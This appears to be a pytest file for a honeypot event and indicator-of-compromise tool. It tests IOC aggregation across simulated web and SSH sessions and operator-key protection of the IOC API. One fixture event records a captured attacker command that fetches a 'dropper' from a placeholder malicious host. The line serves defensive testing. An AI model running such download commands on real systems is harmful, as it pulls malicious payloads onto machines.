from aegis_nexus.alerts import AlertStore
from aegis_nexus.app import create_app
from aegis_nexus.ioc import IOCWorkspace, ioc_id
from aegis_nexus.model import normalize_event
from aegis_nexus.store import Store


def test_ioc_workspace_aggregates_provenance_and_relationships(tmp_path):
    path = str(tmp_path / "aegis.db")
    store = Store(path)
    alerts = AlertStore(path)
    first = store.ingest(normalize_event({
        "honeypot": "web-1",
        "event_type": "web.payload",
        "observed": {
            "source_ip": "203.0.113.10",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
        "derived": {
            "ioc": [{"type": "domain", "value": "example.invalid", "evidence": ["observed.payload"]}],
        },
    }))
    second = store.ingest(normalize_event({
        "honeypot": "ssh-1",
        "event_type": "command",
        "observed": {
            "source_ip": "203.0.113.11",
            "service": "ssh",
            "protocol": "tcp",
            "destination_port": 22,
        },
        "derived": {
            "ioc": [{"type": "domain", "value": "example.invalid", "evidence": ["observed.command"]}],
        },
    }))

    finding = {
        "schema_version": "1.1",
        "rule_id": "fixture_rule",
        "rule_version": "1.0.0",
        "title": "Fixture",
        "description": "Fixture only",
        "severity": "medium",
        "confidence": 100,
        "source_ip": "203.0.113.10",
        "session_id": first["session_id"],
        "evidence": [{"type": "event", "id": first["id"]}],
    }
    alert = alerts.record(finding, first["timestamp"])
    case = store.create_case({"title": "IOC fixture", "severity": "medium", "tags": ["ioc"]})
    store.add_case_evidence(case["id"], "alert", alert["id"])

    workspace = IOCWorkspace(path)
    listing = workspace.list(q="example.invalid")
    assert len(listing["items"]) == 1
    item = listing["items"][0]
    assert item["id"] == ioc_id("domain", "example.invalid")
    assert item["occurrences"] == 2
    assert item["provenance"] == "derived"
    assert item["classification"] == "artifact"
    assert set(item["source_ips"]) == {"203.0.113.10", "203.0.113.11"}
    assert set(item["event_ids"]) == {first["id"], second["id"]}

    detail = workspace.get(item["id"])
    assert detail["alert_ids"] == [alert["id"]]
    assert detail["case_ids"] == [case["id"]]
    assert any("not Threat Intelligence" in value for value in detail["limitations"])


def test_ioc_workspace_api_is_operator_protected_and_searchable(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "sensor-secret",
        "OPERATOR_API_KEY": "operator-secret",
    })
    client = app.test_client()
    created = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "sensor-secret"},
        json={
            "honeypot": "ssh-1",
            "event_type": "command",
            "observed": {
                "source_ip": "203.0.113.55",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget https://payload.example.invalid/dropper",
            },
        },
    )
    assert created.status_code == 201
    assert client.get("/api/v1/iocs").status_code == 401

    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    listing = client.get("/api/v1/iocs?q=payload.example.invalid&type=domain", headers=operator)
    assert listing.status_code == 200
    items = listing.get_json()["items"]
    assert items
    item = next(entry for entry in items if entry["value"] == "payload.example.invalid")
    detail = client.get(f"/api/v1/iocs/{item['id']}", headers=operator)
    assert detail.status_code == 200
    assert created.get_json()["id"] in detail.get_json()["event_ids"]
